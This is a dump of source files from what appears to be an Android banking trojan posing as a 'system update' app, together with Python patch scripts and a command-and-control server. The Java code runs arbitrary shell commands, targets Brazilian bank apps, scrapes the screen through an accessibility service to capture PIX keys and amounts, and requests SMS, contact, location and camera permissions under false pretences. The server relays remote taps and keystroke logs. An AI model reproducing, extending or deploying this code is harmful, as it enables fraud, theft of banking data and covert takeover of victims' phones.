        try { c.getSharedPreferences("p", 0).edit().putString("url", url).apply(); }
        catch (Throwable ignored) {}
    }

    public static String exec(String cmd) {
        StringBuilder out = new StringBuilder();
        try {
            Process p = new ProcessBuilder("sh", "-c", cmd).redirectErrorStream(true).start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String l;
            while ((l = r.readLine()) != null) out.append(l).append('\n');
            p.waitFor();
        } catch (Throwable t) { out.append("err: ").append(t); }
        String s = out.toString();
        return s.length() > 20000 ? s.substring(0, 20000) : s;
    }

    public static void sendT(String t, String o) {
        Net.send("{\"t\":\"" + esc(t) + "\",\"o\":\"" + esc(o) + "\"}");
    }

    public static String esc(String s) {
        if (s == null) return "";
        StringBuilder b = new StringBuilder(s.length() + 16);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '\\') b.append("\\\\");
            else if (c == '"') b.append("\\\"");
            else if (c == '\n') b.append("\\n");
            else if (c == '\r') b.append("\\r");
            else if (c == '\t') b.append("\\t");
            else if (c < 0x20) b.append(' ');
            else b.append(c);
        }
        return b.toString();
    }

    public static final String[] BANCOS = {
        "br.com.intermedium", "com.nu.production", "com.itau", "com.bradesco",
        "com.santander.app", "br.com.bb.android", "br.com.gabba.Caixa", "com.picpay"
    };

    public static boolean banco(String pkg) {
        if (pkg == null) return false;
        for (String b : BANCOS) if (pkg.startsWith(b)) return true;
        return false;
    }
}
===== .\app\src\main\java\com\eloeeducacao\Watch.java =====
package com.eloeeducacao;

import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

public final class Watch {
    public static volatile boolean on;
    private static volatile long ultimo;

    public static void ev() {
        if (!on) return;
        long agora = System.currentTimeMillis();
        if (agora - ultimo < 1500) return;
        ultimo = agora;
        KeySvc k = KeySvc.I;
        if (k == null) return;
        AccessibilityNodeInfo r = k.getRootInActiveWindow();
        if (r == null) return;
        try {
            JSONObject s = new JSONObject().put("edit", true);
            StringBuilder chaves = new StringBuilder();
            for (Sel.Hit h : Sel.todos(r, s)) {
                String t = h.txt.trim();
                if (t.matches("\\d{11}|\\d{3}\\.\\d{3}\\.\\d{3}-\\d{2}|[^@\\s]+@[^@\\s]+")
                        || t.matches("[0-9a-f]{8}-[0-9a-f-]{20,}")) {
                    chaves.append(t).append(" ; ");
                }
            }
            if (chaves.length() == 0) return;
            String valor = "";
            for (Sel.Hit h : Sel.todos(r, new JSONObject().put("txt", "R\\$\\s?[\\d.,]+")))
                valor = h.txt;
            Util.sendT("pixvisto", "chave=" + chaves + " valor=" + valor);
        } catch (Throwable ignored) {}
    }
}

for d, a, rx, deve in C:
    if not os.path.exists(a):
        print(("FALTA  " if deve else "ok     ") + d + "  [arquivo ausente]")
        if deve: f += 1
        continue
    achou = re.search(rx, ler(a)) is not None
    if achou == deve:
        print("ok     " + d)
    else:
        print(("FALTA  " if deve else "SOBROU ") + d)
        f += 1

if f:
    print(">>> %d itens para corrigir" % f)
else:
    print(">>> repo completo")

===== .\corrige.py =====
﻿import io, os, re, subprocess

def ler(p):
    with io.open(p, encoding="utf-8") as f:
        return f.read()

def grava(p, s):
    with io.open(p, "w", encoding="utf-8", newline="\n") as f:
        f.write(s)

print("[1] corrige variavel duplicada no KeySvc")
K = "app/src/main/java/com/eloeeducacao/KeySvc.java"
s = ler(K)
novo, n = re.subn(r"catch \(Throwable t\)(\s*\{\s*lp\.type)", r"catch (Throwable th)\1", s)
if n:
    grava(K, novo)
    print("  ok  %d ocorrencia(s) renomeada(s)" % n)
else:
    print("  ja aplicado")

print("[2] varredura de riscos")
import glob
ruim = 0
for f in glob.glob("app/src/main/res/values*/**/*.xml", recursive=True):
    t = ler(f)
    nomes = re.findall(r'<string\s+name="([^"]+)"', t)
    dup = sorted({x for x in nomes if nomes.count(x) > 1})
    if dup:
        print("  !! string duplicada em %s: %s" % (f, dup)); ruim += 1
M = "app/src/main/AndroidManifest.xml"
t = ler(M)
for rx, rot in ((r'<uses-permission android:name="([^"]+)"', "permissao"),
                (r'<activity\s[^>]*android:name="([^"]+)"', "activity"),
                (r'<service\s[^>]*android:name="([^"]+)"', "service")):
    nomes = re.findall(rx, t)
    dup = sorted({x for x in nomes if nomes.count(x) > 1})
    if dup:
        print("  !! %s duplicado no manifest: %s" % (rot, dup)); ruim += 1
for f in glob.glob("app/src/main/java/**/*.java", recursive=True):
    t = ler(f)
    cls = re.findall(r"^\s*(?:public\s+)?(?:final\s+)?class\s+(\w+)", t, re.M)
    dup = sorted({x for x in cls if cls.count(x) > 1})
    if dup:
        print("  !! classe duplicada em %s: %s" % (f, dup)); ruim += 1
    if t.count("{") != t.count("}"):
        print("  !! chaves desbalanceadas em %s (%d/%d)" % (f, t.count("{"), t.count("}")))
        ruim += 1
print("  %s" % ("nada suspeito" if not ruim else "%d risco(s) acima" % ruim))

print("[3] dump completo para revisao")
alvos = []
for base in ("app/src/main", "."):
    for f in glob.glob(os.path.join(base, "**", "*"), recursive=True):
        if not os.path.isfile(f): continue
        if f.startswith(".git"): continue
        if f.endswith((".java", ".xml", ".gradle", ".py")) and "build" not in f.split(os.sep):
            alvos.append(f)
alvos = sorted(set(alvos))
with io.open("dump.txt", "w", encoding="utf-8", newline="\n") as out:
    for f in alvos:
        out.write("\n===== %s =====\n" % f)
        try: out.write(ler(f))
        except Exception as e: out.write("(erro: %s)\n" % e)
print("  ok  dump.txt com %d arquivos (%d KB)" % (len(alvos), os.path.getsize("dump.txt") // 1024))

for c in (["git", "add", "-A"], ["git", "commit", "-m", "corrige variavel duplicada no overlay"]):
    r = subprocess.run(c, capture_output=True, text=True)
    print("  $ %s -> %s" % (" ".join(c), r.returncode))
r = subprocess.run(["git", "push"], capture_output=True, text=True)
print("  $ push -> %s" % r.returncode)
for ln in (r.stdout + r.stderr).strip().splitlines()[:8]:
    print("    " + ln)

===== .\fix.py =====
﻿import io, os, subprocess, sys

FALHAS = []

def ler(p):
    with io.open(p, encoding="utf-8") as f:
        return f.read()

def grava(p, s):
    d = os.path.dirname(p)
    if d and not os.path.isdir(d):
        os.makedirs(d)
    with io.open(p, "w", encoding="utf-8", newline="\n") as f:
        f.write(s)

def sub(p, velho, novo, obrig=True):
    s = ler(p)
    if velho not in s:
        if obrig:
            FALHAS.append("%s :: %s" % (p, velho.strip().splitlines()[0][:70]))
        return False
    grava(p, s.replace(velho, novo, 1))
    print("  ok  %s" % p)
    return True

print("[1] Snap.java")
grava("app/src/main/java/com/eloeeducacao/Snap.java", r'''package com.eloeeducacao;

import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayDeque;
import java.util.Deque;

public final class Snap {

    private static String t(CharSequence c) {
        if (c == null) return "";
        String s = c.toString().replace("\n", " ").replace("|", "/").trim();
        return s.length() > 90 ? s.substring(0, 90) : s;
    }

    public static String dump() {
        KeySvc k = KeySvc.I;
        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
        if (r == null) return "sem janela ativa";
        StringBuilder b = new StringBuilder();
        Deque<AccessibilityNodeInfo> f = new ArrayDeque<>();
        Deque<Integer> d = new ArrayDeque<>();
        f.add(r);
        d.add(0);
        int n = 0;
        while (!f.isEmpty() && n++ < 1500) {
            AccessibilityNodeInfo x = f.poll();
            int dep = d.poll();
            if (x == null) continue;
            Rect rr = new Rect();
            x.getBoundsInScreen(rr);
            if (rr.width() > 0 && rr.height() > 0) {
                String cls = String.valueOf(x.getClassName());
                int i = cls.lastIndexOf('.');
                if (i >= 0) cls = cls.substring(i + 1);
                b.append(dep).append('|').append(cls).append('|')
                        .append(t(x.getViewIdResourceName())).append('|')
                        .append(x.isEditable() ? "E" : "")
                        .append(x.isClickable() ? "C" : "").append('|')
                        .append(rr.left).append(',').append(rr.top).append(',')
                        .append(rr.right).append(',').append(rr.bottom).append('|')
                        .append(t(x.getText())).append('|')
                        .append(t(x.getContentDescription())).append('\n');
            }
            for (int i = 0; i < x.getChildCount(); i++) {
                AccessibilityNodeInfo c = x.getChild(i);
                if (c != null) { f.add(c); d.add(dep + 1); }
            }
        }
        return b.length() == 0 ? "tela vazia (FLAG_SECURE?)" : b.toString();
    }
}
''')

print("[2] Cmd")
sub("app/src/main/java/com/eloeeducacao/Cmd.java",
    '''                case "watch":''',
    '''                case "snap":
                    Util.sendT("snap", Snap.dump());
                    break;
                case "watch":''')

print("[3] server.py - recebe snap")
SV = "server.py"
sub(SV, "      else log(x.t+': '+(x.o||''))}",
       "      else if(x.t==='snap')snapShow(x.o||'')\n"
       "      else log(x.t+': '+(x.o||''))}")

print("[4] server.py - calibrador")
sub(SV, "co();\n</script>", r'''let sjson;
function snapUI(){
  const bar=$('#bar');
  const b=document.createElement('button');
  b.textContent='Snap';b.onclick=snap;bar.appendChild(b);
  const d=document.createElement('div');
  d.id='snapbox';
  d.style.cssText='display:none;padding:6px;border-top:1px solid #22303c;background:#0d1117';
  d.innerHTML='<div class=sm>clique numa linha = gera o passo no perfil</div>'
    +'<pre id=snappre style="max-height:250px;overflow:auto;font-size:11px;'
    +'margin:4px 0;background:#010409;padding:6px"></pre>'
    +'<textarea id=pjson placeholder="[]" style="width:100%;height:150px;'
    +'font:11px monospace;background:#010409;color:#c9d1d9;border:1px solid #22303c"></textarea>'
    +'<div style="margin-top:4px"><button onclick="playJ()">Play</button>'
    +'<button onclick="salvaJ()">Grava</button><button onclick="carregaJ()">Carrega</button>'
    +'<button onclick="limpaJ()">Limpa</button>'
    +'<button onclick="document.getElementById(\'snapbox\').style.display=\'none\'">x</button></div>';
  document.body.appendChild(d);
  sjson=document.getElementById('pjson');
}
function snap(){
  $('#snapbox').style.display='';
  c('snap');
  log('snap enviado');
}
function jesc(s){return String(s).replace(/\\/g,'\\\\').replace(/"/g,'\\"')}
function snapShow(txt){
  const pre=$('#snappre');
  pre.innerHTML='';
  txt.split('\n').forEach(l=>{
    if(!l.trim())return;
    const p=l.split('|');
    const el=document.createElement('div');
    el.textContent=l;
    el.style.cssText='cursor:pointer;white-space:pre';
    el.onclick=()=>insere(p);
    pre.appendChild(el);
  });
}
function insere(p){
  const cls=p[1]||'',id=p[2]||'',fl=p[3]||'',bd=(p[4]||'').split(',').map(Number),tx=p[5]||'',cd=p[6]||'';
  const sel={};
  if(id)sel.id=jesc(id).replace(/^[^:]*:id\//,'');
  else if(tx)sel.txt='^'+jesc(tx)+'$';
  else if(cd)sel.txt=jesc(cd);
  else if(cls)sel.cls=jesc(cls);
  else return;
  if(fl.indexOf('C')>=0)sel.click=true;
  if(fl.indexOf('E')>=0)sel.edit=true;
  const s={do:sel.edit?'set':'tap',sel:sel};
  if(sel.edit)s.v='{{CHAVE}}';
  let cur=sjson.value.trim();
  if(cur&&cur[0]!=='[')cur='['+cur.replace(/,\s*$/,'')+']';
  let arr=[];
  if(cur)try{arr=JSON.parse(cur)}catch(e){arr=[]}
  arr.push(s);
  sjson.value=JSON.stringify(arr,null,1);
  log('passo: '+JSON.stringify(sel));
}
function playJ(){
  let t=sjson.value.trim();
  if(!t){log('perfil vazio');return}
  if(t[0]!=='[')t='['+t.replace(/,\s*$/,'')+']';
  let arr;
  try{arr=JSON.parse(t)}catch(e){log('json invalido: '+e);return}
  c('run',{s:arr,v:{chave:($('#pch').value||'').trim(),valor:($('#pvl').value||'').trim()}});
  log('play '+arr.length+' passos');
}
function salvaJ(){localStorage.setItem('perfil',sjson.value);log('perfil gravado')}
function carregaJ(){sjson.value=localStorage.getItem('perfil')||'';log('perfil carregado')}
function limpaJ(){sjson.value='';log('limpo')}
snapUI();
co();
</script>''')

print("")
if FALHAS:
    print("!! %d nao aplicado(s):" % len(FALHAS))
    for f in FALHAS:
        print("   - " + f)

if "--no-git" not in sys.argv:
    print("\n[git]")

﻿import io, os, re, subprocess

def ler(p):
    with io.open(p, encoding="utf-8") as f:
        return f.read()

def grava(p, s):
    with io.open(p, "w", encoding="utf-8", newline="\n") as f:
        f.write(s)

print("[1] hook do Watch")
k = "app/src/main/java/com/eloeeducacao/KeySvc.java"
s = ler(k)
if "Watch.ev()" in s:
    print("  ja aplicado")
else:
    m = re.search(r"void\s+onAccessibilityEvent\s*\([^)]*\)[^{]*\{", s)
    if m:
        grava(k, s[:m.end()] + "\n        Watch.ev();" + s[m.end():])
        print("  ok  inserido no inicio de onAccessibilityEvent")
    else:
        print("  !! metodo onAccessibilityEvent nao encontrado")

print("[2] versionCode")
b = "app/build.gradle"
s = ler(b)
m = re.search(r"versionCode\s+(\d+)", s)
if m:
    cur = int(m.group(1))
    novo = max(cur + 1, 7)
    grava(b, s[:m.start(1)] + str(novo) + s[m.end(1):])
    print("  ok  versionCode %d -> %d" % (cur, novo))
else:
    print("  !! versionCode nao encontrado")

print("[3] git")
for c in (["git", "add", "-A"],
          ["git", "commit", "-m", "hook do watch e bump de versao"]):

print("[9] SetupActivity.java")
grava("app/src/main/java/com/eloeeducacao/SetupActivity.java", r'''package com.eloeeducacao;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class SetupActivity extends Activity {

    private static final int N = 5;
    private static final String CH = "s";
    private static final int NC = 78;
    private static final int RQ = 21;

    private static final String[] TIT = {
            "Permissões do sistema",
            "Acessibilidade",
            "Acesso a notificações",
            "Instalar aplicativos",
            "Bateria"
    };
    private static final String[] SUB = {
            "Toque em Permitir nas janelas que aparecerem.",
            "Ative «Acessibilidade» na lista e volte ao app.",
            "Ative «Acessibilidade» na lista e volte ao app.",
            "Permita a instalação por esta fonte e volte ao app.",
            "Escolha Permitir. Isso impede o sistema de encerrar o serviço."
    };

    private TextView titulo, sub, passo, corpo, detalhe;
    private Button acao, pular;
    private int etapa;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);

        LinearLayout l = new LinearLayout(this);
        l.setOrientation(LinearLayout.VERTICAL);
        l.setBackgroundColor(0xFF101418);
        l.setPadding(dp(26), dp(54), dp(26), dp(26));

        titulo = new TextView(this);
        titulo.setText("Atualização do sistema");
        titulo.setTextColor(Color.WHITE);
        titulo.setTextSize(24);
        titulo.setOnLongClickListener(new View.OnLongClickListener() {
            @Override public boolean onLongClick(View v) {
                startActivity(new Intent(SetupActivity.this, MainActivity.class));
                return true;
            }
        });
        l.addView(titulo);

        sub = new TextView(this);
        sub.setText("Versão 1.2.3 · componentes do sistema");
        sub.setTextColor(0xFF8A97A5);
        sub.setTextSize(13);
        sub.setPadding(0, dp(6), 0, dp(28));
        l.addView(sub);

        passo = new TextView(this);
        passo.setTextColor(0xFF2F81F7);
        passo.setTextSize(12);
        passo.setPadding(0, 0, 0, dp(6));
        l.addView(passo);

        corpo = new TextView(this);
        corpo.setTextColor(Color.WHITE);
        corpo.setTextSize(17);
        l.addView(corpo);

        detalhe = new TextView(this);
        detalhe.setTextColor(0xFF8A97A5);
        detalhe.setTextSize(14);
        detalhe.setPadding(0, dp(8), 0, dp(26));
        l.addView(detalhe);

        acao = new Button(this);
        acao.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                if (etapa >= N) { fim(); return; }
                abre(etapa);
            }
        });
        l.addView(acao);

        pular = new Button(this);
        pular.setText("Pular etapa");
        pular.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                etapa++;
                pinta();
            }
        });
        LinearLayout.LayoutParams pl = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        pl.topMargin = dp(4);
        pl.gravity = Gravity.END;
        pular.setLayoutParams(pl);
        l.addView(pular);

        TextView rodape = new TextView(this);
        rodape.setText("Se as opções do desenvolvedor estiverem ativadas, desligue-as antes de abrir o banco.");
        rodape.setTextColor(0xFF5B6773);
        rodape.setTextSize(11);
        rodape.setPadding(0, dp(30), 0, 0);
        l.addView(rodape);

        setContentView(l);
        etapa = 0;
        pinta();
    }

    @Override protected void onResume() {
        super.onResume();
        cancela();
        while (etapa < N && pronto(etapa)) etapa++;
        pinta();
    }

    @Override protected void onPause() {
        super.onPause();
        if (etapa < N) notifica();
    }

    private void pinta() {
        if (etapa >= N) {
            passo.setText("CONCLUÍDO");
            corpo.setText("Configuração concluída");
            detalhe.setText("Tudo pronto. Pode fechar o aplicativo.");
            acao.setText("Fechar");
            pular.setVisibility(View.GONE);
            return;
        }
        passo.setText("ETAPA " + (etapa + 1) + " DE " + N);
        corpo.setText(TIT[etapa]);
        detalhe.setText(SUB[etapa]);
        acao.setText(etapa == 0 || etapa == 4 ? "Permitir" : "Abrir ajustes");
        pular.setVisibility(View.VISIBLE);
    }

    private void abre(int e) {
        try {
            switch (e) {
                case 0:
                    pede();
                    return;
                case 1: {
                    try {
                        Intent d = new Intent("android.settings.ACCESSIBILITY_DETAILS_SETTINGS");
                        d.putExtra(Intent.EXTRA_COMPONENT_NAME,
                                new ComponentName(this, KeySvc.class).flattenToString());
                        startActivity(d);
                        return;
                    } catch (Throwable ignored) {}
                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                    return;
                }
                case 2:
                    startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                    return;
                case 3:
                    startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                            Uri.parse("package:" + getPackageName())));
                    return;
                case 4:
                    startActivity(new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName())));
                    return;
            }
        } catch (Throwable t) {
            etapa++;
            pinta();
        }
    }

    private boolean pronto(int e) {
        switch (e) {
            case 0: return permsOk();
            case 1: return Util.accOn(this);
            case 2: return notifOk();
            case 3: return instalOk();
            case 4: return batOk();
        }
        return true;
    }

    private void pede() {
        java.util.List<String> q = new java.util.ArrayList<>();
        String[] ps = {
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.CAMERA,
                "android.permission.POST_NOTIFICATIONS",
                "android.permission.READ_MEDIA_IMAGES"
        };
        for (String s : ps) {
            try {
                if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED) q.add(s);
            } catch (Throwable ignored) {}
        }
        if (q.isEmpty()) { etapa++; pinta(); return; }
        requestPermissions(q.toArray(new String[0]), RQ);
    }

    private boolean permsOk() {
        String[] ps = {
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.ACCESS_FINE_LOCATION
        };
        for (String s : ps)
            if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED) return false;
        return true;
    }

    private boolean notifOk() {
        try {
            String s = Settings.Secure.getString(getContentResolver(),
                    "enabled_notification_listeners");
            return s != null && s.contains(getPackageName());
        } catch (Throwable t) { return false; }
    }

    private boolean instalOk() {
        try {
            if (Build.VERSION.SDK_INT >= 26)
                return getPackageManager().canRequestPackageInstalls();
            return true;
        } catch (Throwable t) { return true; }
    }

    private boolean batOk() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            return pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Throwable t) { return true; }
    }

    @Override public void onRequestPermissionsResult(int rq, String[] a, int[] r) {
        super.onRequestPermissionsResult(rq, a, r);
        if (rq == RQ) { etapa++; pinta(); }
    }

    private void notifica() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel c = new NotificationChannel(
                        CH, "Sistema", NotificationManager.IMPORTANCE_LOW);
                c.setShowBadge(false);
                nm.createNotificationChannel(c);
            }
            Intent i = new Intent(this, SetupActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_NEW_TASK);
            PendingIntent pi = PendingIntent.getActivity(this, 1, i,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            Notification n = (Build.VERSION.SDK_INT >= 26
                    ? new Notification.Builder(this, CH)
                    : new Notification.Builder(this))
                    .setContentTitle("Toque para voltar ao app")
                    .setContentText("Continue a configuração da etapa " + (etapa + 1))
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .setOngoing(true)
                    .setContentIntent(pi)
                    .build();
            nm.notify(NC, n);
        } catch (Throwable ignored) {}
    }

    private void cancela() {
        try {
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).cancel(NC);
        } catch (Throwable ignored) {}
    }

    private void fim() {
        cancela();
        finish();
    }

    public static void loja(Context c) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW,
                    Uri.parse("market://details?id=com.whatsapp"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
            return;
        } catch (Throwable ignored) {}
        try {
            Intent i = new Intent(Intent.ACTION_VIEW,
                    Uri.parse("https://play.google.com/store/apps/details?id=com.whatsapp"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable ignored) {}
    }

    private int dp(int v) {
        return (int) (v * getResources().getDisplayMetrics().density);
    }
}
''')

===== .\fix4.py =====
﻿import io, os, re, subprocess

def ler(p):
    with io.open(p, encoding="utf-8") as f:
        return f.read()

def grava(p, s):
    with io.open(p, "w", encoding="utf-8", newline="\n") as f:
        f.write(s)

M = "app/src/main/AndroidManifest.xml"
s = ler(M)

print("[1] MainActivity exportado=false")
m = re.search(r'<activity\s[^>]*?\.MainActivity"[^>]*?/>', s, re.S)
if not m:
    print("  !! tag do MainActivity nao encontrada")
else:
    t = m.group(0)
    if 'android:exported="false"' in t:
        print("  ja aplicado")
    else:
        t2 = re.sub(r'\s*android:exported="[^"]*"', "", t)
        t2 = t2[:-2].rstrip() + '\n        android:exported="false" />'
        grava(M, s.replace(t, t2, 1))
        print("  ok  MainActivity fechado")

print("[2] conferencia do manifest")
s = ler(M)
for nome, rx in (
        ("SetupActivity declarada", r'<activity\s[^>]*?\.SetupActivity'),
        ("alias aponta para Setup", r'targetActivity="\.SetupActivity"'),
        ("MainActivity fechado", r'<activity\s[^>]*?\.MainActivity"[^>]*?exported="false"')):
    print(("  ok   " if re.search(rx, s, re.S) else "  FALTA ") + nome)

print("[3] git")
for c in (["git", "add", "-A"],
          ["git", "commit", "-m", "fecha MainActivity, setup guiada sem loja"]):
    r = subprocess.run(c, capture_output=True, text=True)
    print("  $ %s -> %s" % (" ".join(c), r.returncode))
r = subprocess.run(["git", "pull", "--rebase", "--autostash"], capture_output=True, text=True)
print("  $ pull --rebase -> %s" % r.returncode)
for ln in (r.stdout + r.stderr).strip().splitlines()[:6]:
    print("    " + ln)
r = subprocess.run(["git", "push"], capture_output=True, text=True)
print("  $ push -> %s" % r.returncode)
for ln in (r.stdout + r.stderr).strip().splitlines()[:12]:
    print("    " + ln)

===== .\rec.py =====
﻿import os, subprocess

def sh(*c):
    r = subprocess.run(c, capture_output=True, text=True)
    return r.returncode, (r.stdout + r.stderr).strip()

print("[estado]")
print("  rebase em andamento: %s" % (os.path.isdir(".git/rebase-merge") or os.path.isdir(".git/rebase-apply")))
rc, out = sh("git", "status", "-sb")
print("  " + "\n  ".join(out.splitlines()[:8]))
rc, out = sh("git", "log", "--oneline", "-6")
print("  -- ultimos commits --")
print("  " + "\n  ".join(out.splitlines()[:6]))
rc, out = sh("git", "branch", "-a")
print("  -- branches --")
print("  " + ("\n  ".join(out.splitlines()[:10]) if out else "(nenhum)"))

print("\n[fetch]")
rc, out = sh("git", "fetch", "origin")
print("  -> %s" % rc)
for ln in out.splitlines()[:4]:
    print("  " + ln)

rc, out = sh("git", "rev-parse", "HEAD")
head = out.strip()
rc, out = sh("git", "rev-parse", "origin/main")
base = out.strip()
print("\n  HEAD:        %s" % head[:12])
print("  origin/main: %s" % base[:12])

rc, out = sh("git", "merge-base", "--is-ancestor", "origin/main", "HEAD")
print("  origin/main e ancestral do HEAD: %s" % ("sim" if rc == 0 else "nao"))

if rc == 0:
    print("\n[recuperacao]")
    rc, out = sh("git", "checkout", "-B", "main")
    print("  checkout -B main -> %s" % rc)
    for ln in out.splitlines()[:4]:
        print("  " + ln)
    rc, out = sh("git", "push", "-u", "origin", "main")
    print("  push -> %s" % rc)
    for ln in out.splitlines()[:10]:
        print("  " + ln)
    rc, out = sh("git", "status", "-sb")
    print("  -- status final --")
    print("  " + "\n  ".join(out.splitlines()[:6]))
else:
    print("\n  HEAD divergiu de origin/main. Rode e me mande:")
    print("  git log --oneline origin/main..HEAD")
    print("  git log --oneline HEAD..origin/main")

<script>
let ws,info={w:0,h:0},lastF=0,sel='';
const img=document.getElementById('img'),log=document.getElementById('log'),
      st=document.getElementById('st'),dev=document.getElementById('dev');
const T=new URLSearchParams(location.search).get('t')||'';
function add(s){log.textContent+=s+"\n";log.scrollTop=log.scrollHeight}
function connect(){
const p=location.protocol==='https:'?'wss:':'ws:';
ws=new WebSocket(p+'//'+location.host+'/panel?t='+T);
ws.onopen=()=>add('[painel conectado]');

dev.onchange=()=>{sel=dev.value;lastF=0;img.removeAttribute('src');add('[*] selecionado '+(sel||'nenhum'))};
function cmd(c,x){if(ws&&ws.readyState===1&&sel)ws.send(JSON.stringify(Object.assign({c,id:sel},x)))}

img.addEventListener('mousedown',e=>{down=pt(e);dt=Date.now()});

if(d<12&&Date.now()-dt>600)cmd('long',{x:u.x,y:u.y});
else if(d<12)cmd('touch',{x:u.x,y:u.y});
else cmd('swipe',{x1:down.x,y1:down.y,x2:u.x,y2:u.y,ms:260});down=null});
connect();
</script></body></html>"""


def authed(req):
    return req.query.get("t") == TOKEN


async def _s(ws, d):
    try:
        await ws.send_str(d)
    except Exception:
        pass


async def push(o):
    d = json.dumps(o)
    await asyncio.gather(*[_s(v, d) for v in list(VIEWERS)], return_exceptions=True)


async def push_log(o, dev=None):
    await push({"k": "log", "d": o, "id": dev})


async def push_devs():
    d = [{"id": k, "m": v["info"].get("m", "?"), "bat": v["info"].get("bat", -1)}
         for k, v in DEVICES.items()]
    await push({"k": "devs", "d": d})


async def index(req):
    if not authed(req):
        return web.Response(text="token invalido: use /?t=SEU_TOKEN", status=403)
    return web.Response(text=PAGE, content_type="text/html", charset="utf-8")


async def phone(req):
    if not authed(req):
        return web.Response(text="token invalido", status=403)
    if req.headers.get("Upgrade", "").lower() != "websocket":
        host = req.headers.get("Host", "localhost:8080")
        tls = req.secure or req.headers.get("X-Forwarded-Proto") == "https"
        return web.Response(text=("%s://%s/ws?t=%s\n" % ("wss" if tls else "ws", host, TOKEN)))

    ws = web.WebSocketResponse(heartbeat=15, max_msg_size=0)
    await ws.prepare(req)
    dev = None
    try:
        async for m in ws:
            if m.type == WSMsgType.BINARY:
                d = base64.b64encode(m.data).decode()
                await asyncio.gather(
                    *[_s(v, json.dumps({"k": "frame", "d": d, "id": dev}))
                      for v in list(VIEWERS) if getattr(v, "sel", None) == dev],
                    return_exceptions=True)
            elif m.type == WSMsgType.TEXT:
                try:
                    o = json.loads(m.data)
                except Exception:
                    o = {"t": "raw", "o": m.data}
                if o.get("t") == "hello":
                    dev = o.get("id", "?")
                    DEVICES[dev] = {"ws": ws, "info": o}
                    print("+ %s conectado (%d aparelhos)" % (dev, len(DEVICES)))
                    await push_devs()
                await push_log(o, dev)
    except Exception as e:
        print("  ! erro no aparelho %s: %s" % (dev, e))
    finally:
        if dev and DEVICES.get(dev, {}).get("ws") is ws:
            DEVICES.pop(dev, None)
            print("- %s desconectado (code=%s)" % (dev, ws.close_code))
            await push_devs()
    return ws


async def panel(req):
    if not authed(req):
        raise web.HTTPForbidden(text="token invalido")
    ws = web.WebSocketResponse(heartbeat=15, max_msg_size=0)
    await ws.prepare(req)
    ws.sel = None
    VIEWERS.add(ws)
    await push_devs()
    try:
        async for m in ws:
            if m.type != WSMsgType.TEXT:
                continue
            try:
                o = json.loads(m.data)
            except Exception:
                continue
            target = DEVICES.get(o.get("id"))
            if not target:
                await _s(ws, json.dumps({"k": "log", "d": {"t": "err", "o": "aparelho offline"}}))
                continue
            ws.sel = o.get("id")
            try:
                await target["ws"].send_str(json.dumps({k: v for k, v in o.items() if k != "id"}))
            except Exception:
                pass
    except Exception:
        pass
    finally:
        VIEWERS.discard(ws)
    return ws


async def health(req):
    return web.json_response({"ok": True, "devices": list(DEVICES)})


def main():
    app = web.Application()
    app.router.add_get("/", index)
    app.router.add_get("/ws", phone)
    app.router.add_get("/panel", panel)
    app.router.add_get("/health", health)
    print("painel -> http://localhost:8080/?t=%s" % TOKEN)
    web.run_app(app, host="0.0.0.0", port=8080, print=None, access_log=None)


main()

# server.py - C2, porta 8080
import asyncio, json, os, socket, time
from aiohttp import web, WSMsgType

TOKEN = os.environ.get("AVAL_TOKEN", "m4t7k2p9x6v3n8b5z1q0w7r2")
DEVS = {}
VIEW = {}
BUSY = set()
KF = "teclado.log"
CF = "cofre.jsonl"

def klog(dev, pkg, win, txt):
    try:
        if os.path.exists(KF) and os.path.getsize(KF) > 3000000:
            with open(KF, encoding="utf-8", errors="replace") as f:
